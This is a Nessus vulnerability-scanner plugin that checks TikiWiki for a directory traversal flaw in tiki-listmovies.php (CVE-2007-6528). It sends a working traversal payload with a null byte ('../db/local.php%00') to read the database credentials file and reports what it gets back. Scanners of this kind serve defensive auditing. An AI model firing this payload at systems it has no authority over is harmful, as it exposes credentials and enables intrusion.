#
#  (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(29799);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2014/08/09 00:11:25 $");

  script_cve_id("CVE-2007-6528");
  script_bugtraq_id(27008);
  script_osvdb_id(41178);

  script_name(english:"Tikiwiki tiki-listmovies.php movie Parameter Traversal Arbitrary File Access");
  script_summary(english:"Tries to read a local file using tiki-listmovies.php");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a
directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running TikiWiki, an open source wiki application
written in PHP.

The version of TikiWiki installed on the remote host fails to sanitize
input to the 'movie' parameter of the 'tiki-listmovies.php' script
before using it to access files.  An unauthenticated attacker may be
able to leverage this issue to read up to 1000 lines of arbitrary
files on the remote host, subject to the privileges of the web server
user id.

Note that successful exploitation is possible regardless of PHP's
'magic_quotes_gpc' and 'register_globals' settings." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/485482/30/0/threaded");
 script_set_attribute(attribute:"see_also", value:"http://tikiwiki.org/ReleaseProcess199" );
 script_set_attribute(attribute:"solution", value:"Upgrade to Tikiwiki 1.9.9 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);

 script_set_attribute(attribute:"plugin_publication_date", value:"2007/12/26");

script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:tikiwiki:tikiwiki");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2014 Tenable Network Security, Inc.");

  script_dependencies("tikiwiki_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP","www/tikiwiki");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
port = get_http_port(default:80,php:TRUE);

install = get_install_from_kb(appname:'tikiwiki', port:port, exit_on_fail:TRUE);
dir = install['dir'];

file = "../db/local.php";
w = http_send_recv3(method:"GET",
    item:string(
      dir, "/tiki-listmovies.php?",
      "movie=", file, "%001234"
    ),
    port:port,
    exit_on_fail:TRUE
  );

  res = w[2];

# There's a problem if there's an entry for root.
if ('$pass_tiki' >< res)
{
  contents = strstr(res, '<object classid=');
  if ('width="' >< contents)
    contents = strstr(contents, 'width="') - 'width="';
  if ('"  height="' >< contents)
    contents = contents - strstr(contents, '"  height="');
  if ('$pass_tiki' >!< contents) contents = res;

  if (report_verbosity > 0)
  {
    info = string(
      "\n",
      "Here are the contents of Tikiwiki's 'db/local.php' file that Nessus\n",
      "was able to read from the remote host :\n",
      "\n",
      contents
      );
    security_warning(port:port, extra:info);
  }
  else security_warning(port);
  exit(0);
}
